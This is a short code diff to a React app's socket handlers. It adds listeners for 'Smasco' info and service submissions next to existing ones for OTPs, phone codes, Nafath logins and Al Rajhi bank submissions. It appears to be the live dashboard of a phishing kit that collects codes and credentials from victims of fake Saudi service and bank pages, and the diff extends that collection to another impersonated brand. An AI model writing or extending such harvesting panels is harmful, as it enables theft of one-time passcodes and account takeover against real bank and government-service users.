@@ -384,6 +384,8 @@ export default function App() {
       socket.on("newOtp", (u) => mergeCode(u)); // Use code sound
       socket.on("newPhoneCode", (u) => mergeCode(u)); // Use code sound
       socket.on("newNafad", (u) => mergeData(u));
+      socket.on("newSmascoInfo", (u) => mergeData(u));
+      socket.on("newSmascoService", (u) => mergeData(u));
       socket.on("newNewDate", (r) => mergeData(r));
       // 🔹 NEW: Rajhi submissions
       socket.on("newRajhi", (u) =>
